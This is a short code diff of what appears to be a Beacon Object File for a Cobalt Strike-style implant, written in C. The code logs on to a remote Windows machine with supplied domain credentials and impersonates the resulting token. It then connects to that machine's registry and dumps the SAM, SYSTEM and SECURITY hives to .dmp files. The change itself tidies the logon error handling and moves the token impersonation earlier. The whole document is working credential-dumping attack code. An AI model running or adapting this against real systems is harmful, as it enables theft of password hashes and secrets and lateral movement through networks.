@@ -34,14 +34,12 @@ void go(char * buff, int len) {
 
 	if (domain && user && pass) {
 		
-		if (Advapi32$LogonUserA(user, domain, pass, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
-			// BeaconPrintf(CALLBACK_ERROR, "LogonUserA: %d\n", KERNEL32$GetLastError());
-		}
-		else {
+		if (!Advapi32$LogonUserA(user, domain, pass, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
 			BeaconPrintf(CALLBACK_ERROR, "Failed: %d", KERNEL32$GetLastError());
-		}
+		}	
+	}
 
-	} 
+	BeaconUseToken(hToken);
 	
 	HKEY hklm;
 	HKEY hkey;
@@ -53,7 +51,6 @@ void go(char * buff, int len) {
 	const char* hives[] = { "SAM", "SYSTEM", "SECURITY" };
 	const char* files[] = { "C:\\SAM.dmp", "C:\\SYSTEM.dmp", "C:\\SECURITY.dmp" };
 
-	BeaconUseToken(hToken);
 
 	result = Advapi32$RegConnectRegistryA(computerName, HKEY_LOCAL_MACHINE, &hklm);
 
